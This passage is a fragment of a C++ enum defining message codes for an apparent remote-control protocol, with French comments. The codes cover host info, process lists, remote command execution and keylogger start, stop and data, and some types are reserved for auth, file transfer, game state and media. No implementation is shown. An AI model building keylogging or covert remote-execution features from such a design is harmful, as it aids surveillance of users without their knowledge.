...
enum class MessageType : uint16_t {
    ...
    // Cercle 3 - Contrôle à distance
    HOST_INFO_REQUEST = 0x0020,
    HOST_INFO_RESPONSE = 0x0021,
    PROCESS_LIST_REQUEST = 0x0022,
    PROCESS_LIST_RESPONSE = 0x0023,
    EXECUTE_COMMAND_REQUEST = 0x0024,
    EXECUTE_COMMAND_RESPONSE = 0x0025,
    KEYLOGGER_START_REQUEST = 0x0026,
    KEYLOGGER_STOP_REQUEST = 0x0027,
    KEYLOGGER_DATA = 0x0028,
    KEYLOGGER_STATUS_RESPONSE = 0x0029,
    
    // Cercles futurs (réservés)
    AUTH_REQUEST = 0x0030,
    AUTH_RESPONSE = 0x0031,
    FILE_TRANSFER = 0x0040,
    GAME_STATE = 0x0050,
    MEDIA_STREAM = 0x0060,
